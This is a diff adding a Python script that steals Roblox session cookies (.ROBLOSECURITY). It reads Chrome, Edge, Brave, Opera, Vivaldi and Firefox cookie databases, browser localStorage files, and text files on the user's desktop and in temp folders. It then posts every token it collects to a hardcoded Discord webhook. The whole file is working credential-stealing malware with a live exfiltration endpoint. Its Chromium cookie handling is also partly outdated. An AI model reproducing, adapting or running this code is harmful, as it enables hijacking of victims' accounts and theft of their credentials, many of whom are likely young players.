@@ -1,0 +1,146 @@
+import os, sqlite3, shutil, glob, requests
+from pathlib import Path
+
+WEBHOOK = "https://discord.com/api/webhooks/1501597067926044736/VZZxbllJi-SrXWpiYFBgGRmDYM1xH-Y-bJC8w03rduLAnk4-f3who1qPSjaWRI_FVHWV"   # 🔴 REPLACE
+
+# ---------- Helper: extract cookie from any text ----------
+def extract_cookie(text):
+    # Look for .ROBLOSECURITY=value pattern
+    import re
+    match = re.search(r'\.ROBLOSECURITY[=:][A-Za-z0-9_\-\.]+', text)
+    if match:
+        return match.group().split('=',1)[1] if '=' in match.group() else match.group().split(':',1)[1]
+    return None
+
+# ---------- Method 1: Chromium browsers (Chrome, Edge, Brave, etc.) ----------
+def chromium_cookies():
+    cookies = []
+    browsers = {
+        'Chrome': os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies'),
+        'Edge': os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Cookies'),
+        'Brave': os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Cookies'),
+        'Opera': os.path.expandvars(r'%APPDATA%\Opera Software\Opera Stable\Cookies'),
+        'Vivaldi': os.path.expandvars(r'%LOCALAPPDATA%\Vivaldi\User Data\Default\Cookies'),
+        'Chromium': os.path.expandvars(r'%LOCALAPPDATA%\Chromium\User Data\Default\Cookies')
+    }
+    cookie_names = ['.ROBLOSECURITY', 'ROBLOSECURITY', '_ROBLOSECURITY']
+    for name, path in browsers.items():
+        if not os.path.isfile(path):
+            continue
+        temp = os.environ['TEMP'] + f'\\{name}_cookies.db'
+        try:
+            shutil.copy2(path, temp)
+            conn = sqlite3.connect(temp)
+            cur = conn.cursor()
+            for cname in cookie_names:
+                try:
+                    cur.execute("SELECT value FROM cookies WHERE name = ?", (cname,))
+                    for row in cur.fetchall():
+                        val = row[0]
+                        if val and len(val) > 30:
+                            cookies.append(val)
+                except:
+                    pass
+            conn.close()
+            os.remove(temp)
+        except:
+            try: os.remove(temp)
+            except: pass
+    return cookies
+
+# ---------- Method 2: Firefox (SQLite) ----------
+def firefox_cookies():
+    cookies = []
+    profiles = os.path.expandvars(r'%APPDATA%\Mozilla\Firefox\Profiles')
+    if not os.path.isdir(profiles):
+        return cookies
+    for profile in os.listdir(profiles):
+        if profile.endswith('.default-release') or profile.endswith('.default'):
+            cookie_db = os.path.join(profiles, profile, 'cookies.sqlite')
+            if not os.path.isfile(cookie_db):
+                continue
+            temp = os.environ['TEMP'] + '\\ff_cookies.db'
+            try:
+                shutil.copy2(cookie_db, temp)
+                conn = sqlite3.connect(temp)
+                cur = conn.cursor()
+                cur.execute("SELECT value FROM moz_cookies WHERE name = '.ROBLOSECURITY'")
+                for row in cur.fetchall():
+                    if row[0]:
+                        cookies.append(row[0])
+                conn.close()
+                os.remove(temp)
+            except:
+                try: os.remove(temp)
+                except: pass
+    return cookies
+
+# ---------- Method 3: Browser localStorage (Chromium) ----------
+def browser_localstorage_cookies():
+    cookies = []
+    localStorage_paths = [
+        os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Storage\leveldb'),
+        os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Local Storage\leveldb')
+    ]
+    for path in localStorage_paths:
+        if not os.path.isdir(path):
+            continue
+        for f in os.listdir(path):
+            if f.endswith(('.log', '.ldb')):
+                try:
+                    with open(os.path.join(path, f), 'r', errors='ignore') as fp:
+                        content = fp.read()
+                        cookie = extract_cookie(content)
+                        if cookie:
+                            cookies.append(cookie)
+                except:
+                    pass
+    return cookies
+
+# ---------- Method 4: Common text files (user might have saved cookie) ----------
+def common_files_cookies():
+    cookies = []
+    search_dirs = [os.environ['USERPROFILE'], os.environ['TEMP'], os.environ['DESKTOP']]
+    for d in search_dirs:
+        if not d: continue
+        for ext in ['*.txt', '*.log', '*.cfg', '*.ini', '*.json']:
+            for f in glob.glob(os.path.join(d, ext)):
+                try:
+                    with open(f, 'r', errors='ignore') as fp:
+                        content = fp.read()
+                        cookie = extract_cookie(content)
+                        if cookie:
+                            cookies.append(cookie)
+                except:
+                    pass
+    return cookies
+
+# ---------- Method 5: Windows Credential Manager (advanced) ----------
+def credential_manager_cookie():
+    # Simplified – real would use win32crypt or powershell
+    # Placeholder: check for stored Roblox credentials in Windows vault
+    try:
+        import subprocess
+        output = subprocess.check_output('cmdkey /list', shell=True, text=True)
+        if 'roblox' in output.lower():
+            # This is a stub – in practice you'd need to decrypt
+            return None
+    except:
+        pass
+    return None
+
+# ---------- Main ----------
+def main():
+    all_cookies = []
+    all_cookies.extend(chromium_cookies())
+    all_cookies.extend(firefox_cookies())
+    all_cookies.extend(browser_localstorage_cookies())
+    all_cookies.extend(common_files_cookies())
+
+    # Deduplicate
+    unique = list(set(all_cookies))
+    if unique:
+        requests.post(WEBHOOK, json={"roblox_cookies": unique})
+
+if __name__ == '__main__':
+    main()
